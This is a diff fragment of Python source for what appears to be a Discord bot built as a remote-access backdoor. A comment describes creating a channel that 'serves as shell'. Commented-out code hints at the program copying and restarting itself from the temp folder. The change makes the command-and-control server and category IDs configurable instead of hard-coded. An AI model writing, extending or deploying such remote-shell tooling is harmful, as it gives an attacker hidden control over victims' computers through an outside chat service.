@@ -71,6 +71,8 @@ temp = os.getenv('temp')
             #os.startfile(os.path.join(path, os.path.basename(sys.argv[0])))
     #else:
 TOKEN = ''
+server_id = ''
+category_id = ''
 
 prompt_name = 'test'
 master = commands.Bot(command_prefix='_', intents=discord.Intents.all())
@@ -151,8 +153,8 @@ async def on_ready():
 
     # Create a channel that serves as shell
     exist = False
-    guild = master.get_guild(1138503078102978632)
-    category = guild.get_channel(1156164329348018216)
+    guild = master.get_guild(server_id)
+    category = guild.get_channel(category_id)
     for channel in category.text_channels:
         if str(channel) == prompt_name:
             exist = True
